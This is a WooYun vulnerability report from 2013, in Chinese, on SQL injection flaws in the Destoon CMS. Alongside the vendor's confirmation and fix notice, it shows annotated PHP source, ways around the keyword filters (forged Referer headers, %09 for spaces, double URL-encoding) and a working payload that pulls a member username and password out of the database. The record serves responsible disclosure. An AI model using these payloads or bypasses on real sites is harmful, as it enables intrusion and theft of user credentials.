{"id": 5407, "wybug_id": "wooyun-2013-046387", "wybug_title": "Destoon全版本通杀SQL注入2", "wybug_corp": "DESTOON", "wybug_author": "Chora", "wybug_date": "2013-12-18 21:57", "wybug_open_date": "2014-03-18 21:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-18：\t细节向公众公开  简要描述： 要过年了，加班加点的。个人觉得不应该仅仅只检测用户的输入，而应该在SQL查询前进行检测才能更好的起到防注入的效果吧，因为人总是有遗漏的。 详细说明：  common.inc.php 0x00\nif(!empty($_SERVER['REQUEST_URI'])) strip_uri($_SERVER['REQUEST_URI']);//跟进0x01if($_POST) { $_POST = strip_sql($_POST); strip_key($_POST); }if($_GET) { $_GET = strip_sql($_GET); strip_key($_GET); }...if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP);...$DT_REF = get_env('referer'); //跟进0x01...$forward = isset($forward) ? urldecode($forward) : $DT_REF;//注入1跟进0x02,没有设置forward的话就用referer替代，而referer是由我们控制的而且不受GPC影响，也不受过滤的影响。...$kw = isset($_GET['kw']) ? htmlspecialchars(str_replace(array(\"\\'\"), array(''), trim(urldecode($_GET['kw'])))) : ''; //注入2跟进0x03,这里程序员实际意思是想把'替换成空，应该这么写array('\\''),但是他用的双引号，意思就是将\\'替换成空，这里可以我们通过urldecode成功绕过通用防注入跟引入单引号。程序检查了REQUEST_URI里不能含有',所以这个只有在IIS的平台下，并且是要以cgi/fastcgi运行才不会获取到数据从而绕过。//http://support.microsoft.com/kb/954946/zh-cn//http://support.microsoft.com/kb/2277918/zh-cn$keyword = $kw ? str_replace(array(' ', '*'), array('%', '%'), $kw) : '';//空格替换成%,用%09绕过就行了。...\ninclude/global.func.php 0x01\nfunction strip_uri($uri) {\tif(strpos($uri, '%') !== false) {\t\twhile($uri != urldecode($uri)) {\t\t\t$uri = urldecode($uri);\t\t}\t}\tif(strpos($uri, '<') !== false || strpos($uri, \"'\") !== false || strpos($uri, '\"') !== false || strpos($uri, '0x') !== false) {  //不能出现'\t\tdhttp(403, 0);\t\tdalert('HTTP 403 Forbidden', DT_PATH);\t}}function strip_sql($string) {//由于可伪造referer，还有可以通过urldecode解码绕过，无视下面。\t$search = array(\"/union/i\",\"/0x([a-z0-9]{2,})/i\",\"/select([[:space:]\\*\\/\\-])/i\",\"/update([[:space:]\\*\\/])/i\",\"/replace([[:space:]\\*\\/])/i\",\"/delete([[:space:]\\*\\/])/i\",\"/drop([[:space:]\\*\\/])/i\",\"/outfile([[:space:]\\*\\/])/i\",\"/dumpfile([[:space:]\\*\\/])/i\",\"/load_file\\(/i\",\"/substring\\(/i\",\"/substr\\(/i\",\"/concat\\(/i\",\"/concat_ws\\(/i\",\"/ascii\\(/i\",\"/hex\\(/i\",\"/ord\\(/i\",\"/char\\(/i\");\t$replace = array('unio&#110;','0&#120;\\\\1','selec&#116;\\\\1','updat&#101;\\\\1','replac&#101;\\\\1','delet&#101;\\\\1','dro&#112;\\\\1','outfil&#101;\\\\1','dumpfil&#101;\\\\1','load_fil&#101;(','substrin&#103;(','subst&#114;(','conca&#116;(','concat_w&#115;(','asci&#105;(','he&#120;(','or&#100;(','cha&#114;(');\treturn is_array($string) ? array_map('strip_sql', $string) : preg_replace($search, $replace, $string);}function get_env($type) {\tswitch($type) {\t\tcase 'ip':...\t\tcase 'referer':\t\t\treturn isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';//可伪造。...\nmodule/member/chat.inc.php 0x02\nif($chat) {\t\t\t\t//对话已经存在\t\t\t\tif($chat['touser'] == $_username) {//当前为接收人\t\t\t\t\tif($DT_TIME - $chat['freadtime'] > $MOD['chat_poll']*3) {//发起对话人已经断开\t\t\t\t\t\t$db->query(\"UPDATE {$table} SET fromuser='$chat_fromuser',touser='$chat_touser',tgettime=0 WHERE chatid='$chatid'\");\t\t\t\t\t} else {//发起人在线\t\t\t\t\t\tdheader('?chatid='.$chatid);\t\t\t\t\t}\t\t\t\t\t//\t\t\t\t} else {//当前为发起人\t\t\t\t\tif($DT_TIME - $chat['treadtime'] > $MOD['chat_poll']*3) {//接收人已经断开\t\t\t\t\t\t$db->query(\"UPDATE {$table} SET tgettime=0 WHERE chatid='$chatid'\");\t\t\t\t\t} else {//接收人在线\t\t\t\t\t\t//\t\t\t\t\t}\t\t\t\t}\t\t\t} else {\t\t\t\t$forward = dsafe($forward);\t\t\t\tif(strpos($forward, $MOD['linkurl']) !== false) $forward = '';\t\t\t\t//创建一个新对话\t\t\t\t$db->query(\"INSERT INTO {$table} (chatid,fromuser,touser,tgettime,forward) VALUES ('$chat_id','$chat_fromuser','$chat_touser','0','$forward')\"); //伪造referer注射。/*wooyun'),(12345679801234567890123456789012,(select concat(username,0x2C,password) from destoon_member limit 0,1),'test2test',4,'5访问http://localhost/de/member/chat.php?chatid=12345678901234567890123456789012就能看到注入返回的数据了。*/\t\t\t}\t\t} else if(isset($chatid) && is_md5($chatid)) {\t\t\t$chat = $db->get_one(\"SELECT * FROM {$table} WHERE chatid='$chatid'\");\t\t\tif($chat && $chat['touser'] == $_username) {\t\t\t\t$chat_id = $chatid;\t\t\t\t$chat_status = 3;\t\t\t\tif(check_name($chat['fromuser'])) {\t\t\t\t\tif($DT_TIME - $chat['freadtime'] > $MOD['chat_poll']*3) {//发起对话人已经断开\t\t\t\t\t\t$db->query(\"UPDATE {$table} SET tgettime=0 WHERE chatid='$chatid'\");\t\t\t\t\t\tdheader('chat.php?touser='.$chat['fromuser']);\t\t\t\t\t}\t\t\t\t\t$user = userinfo($chat['fromuser']);\t\t\t\t\t$online = online($user['userid']);\t\t\t\t\t$user['type'] = 'member';\t\t\t\t} else {\t\t\t\t\t$user = array();\t\t\t\t\t$user['type'] = 'guest';\t\t\t\t\t$user['ip'] = $chat['fromuser'];\t\t\t\t\t$user['area'] = ip2area($chat['fromuser']);\t\t\t\t\tif($DT_TIME - $chat['freadtime'] > $MOD['chat_poll']*3) {//发起人是游客，并且已经断开，只能查看记录\t\t\t\t\t\t$time = $DT_TIME - $MOD['chat_poll']*4;\t\t\t\t\t\t$db->query(\"UPDATE {$table} SET freadtime='$time' WHERE chatid='$chatid'\");\t\t\t\t\t}\t\t\t\t}\t\t\t\t$head_title = '与'.($user['type'] == 'guest' ? '【游客】' : $chat['fromuser']).'对话中';\t\t\t} else {\t\t\t\tdheader('chat.php');\t\t\t}\t\t\t$type = 2;\t\t}\napi/select.php 0x03\nlogin();if($action == 'item') {\t$mid > 3 or dheader('DT_PATH');\t\t$from = isset($from) ? trim($from) : 'item';\tisset($username) or $username = '';\t$condition = $mid == 4 ? 'groupid>5' : 'status=3';\tif($keyword) $condition .= \" AND keyword LIKE '%$keyword%'\";//在上面说的条件下，就可以成功引入单引号，双编码注射,比如select就可以编码成selec%2574绕过。\tif($from == 'relate' && $mid == 16) {\t\tcheck_name($username) or exit;\t\t$condition .= \" AND username='$username'\";\t} else {\t\tif($_groupid == 1) {\t\t\tif($from == 'member') $condition .= \" AND username='$_username'\";\t\t} else {\t\t\t$condition .= \" AND username='$_username'\";\t\t}\t}\tif($itemid) $condition .= $mid == 4 ? \" AND userid=$itemid\" : \" AND itemid=$itemid\";\t$order = $mid == 4 ? 'userid DESC' : 'addtime DESC';\t$table = get_table($mid);\t$r = $db->get_one(\"SELECT COUNT(*) AS num FROM {$table} WHERE $condition\");//带入查询。\t$items = $r['num'];\t$pages = pages($items, $page, $pagesize);\t$lists = array();\t$result = $db->query(\"SELECT * FROM {$table} WHERE $condition ORDER BY $order LIMIT $offset,$pagesize\");\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  求保养，继续奋斗。   版权声明：转载请注明来源 Chora@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-12-19 16:07 厂商回复： 已确认存在，我们会尽快修复 最新状态： 2013-12-20：感谢Chora，已修复，详见：http://bbs.destoon.com/thread-55559-1-1.html  ", "replys": "漏洞评价：\n评论\n     2013-12-18 21:59 |    \t\t冻心 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:3        | 爱wooyun  爱生活！)\t\t \n  哇    \n     2013-12-18 21:59 |    \t\t冻心 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:3        | 爱wooyun  爱生活！)\t\t \n  楼下全是我小号    \n     2013-12-18 22:56 |    \t\t小土豆 \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:23        )\t\t \n  楼下全是我小号     \n     2013-12-18 22:59 |    \t\t李宏 \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 白天岂懂夜的黑)\t\t \n  楼下全是我小号     \n     2013-12-19 09:57 |    \t\t松子 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:5        | 无事)\t\t \n  楼下全是我小号    \n     2013-12-26 12:33 |    \t\tdignotice \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | dignotice)\t\t \n  顶一个。    \n     2014-03-18 23:15 |    \t\t郭斯特 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:69        | GhostWin)\t\t \n  专业拆楼    \n     2014-03-19 10:05 |    \t\t乌云白帽子 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:4        | 路人甲)\t\t \n  niu    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}